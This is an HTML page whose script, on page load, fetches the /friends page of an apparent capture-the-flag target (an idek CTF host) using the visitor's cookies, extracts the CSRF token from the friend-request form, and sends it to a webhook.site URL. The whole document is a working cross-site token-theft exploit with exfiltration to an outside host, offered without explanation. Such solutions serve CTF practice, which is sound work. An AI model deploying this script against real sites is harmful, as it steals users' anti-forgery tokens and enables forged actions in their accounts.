<!DOCTYPE html>
<html>
<head>
    <title>CSRF Token Extractor</title>
</head>
<body>
    <h1>Extracting CSRF Token...</h1>
    
    <script>
        const WEBHOOK_URL = 'https://webhook.site/60b2c32b-f130-442d-9eca-da173d2d3634';
        
        // Function to send data to webhook
        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.log("Webhook error:", error.message);
            }
        }
        
        // Function to extract CSRF token only
        async function extractCSRFToken() {
            try {
                console.log("Fetching /friends page...");
                
                const response = await fetch('http://fnotes-web.ctf-chal.idek.team/friends', {
                    credentials: 'include'
                });
                
                const html = await response.text();
                
                // Parse HTML to extract CSRF token
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                
                // Look for CSRF token in the form
                const csrfInput = doc.querySelector('form[action="/friends/request"] input[name="csrf_token"]');
                
                if (csrfInput) {
                    const csrfToken = csrfInput.value;
                    console.log(csrfToken);
                    
                    // Send to webhook
                    await sendToWebhook({
                        csrf_token: csrfToken
                    });
                } else {
                    console.log("CSRF token not found");
                }
                
            } catch (error) {
                console.log("Error:", error.message);
            }
        }
        
        // Start extraction
        extractCSRFToken();
    </script>
</body>
</html>
